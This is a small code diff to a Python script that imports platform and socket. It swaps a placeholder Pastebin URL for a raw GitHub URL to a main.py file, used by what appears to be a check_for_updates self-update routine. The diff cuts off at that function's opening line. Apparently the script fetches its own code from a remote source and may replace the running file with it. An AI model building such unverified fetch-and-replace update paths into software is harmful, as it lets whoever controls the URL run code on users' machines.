@@ -13,8 +13,8 @@ import platform
 import socket
 
 
-PASTEBIN_URL = 'https://pastebin.com/raw/ВАШ_КОД'  # Ссылка на код на пастебине
-CURRENT_FILE = sys.argv[0]  # Имя текущего файла
+PASTEBIN_URL = 'https://raw.githubusercontent.com/MrGoose000/piskapophui/refs/heads/main/main.py'
+CURRENT_FILE = sys.argv[0]
 
 def check_for_updates():
     try:
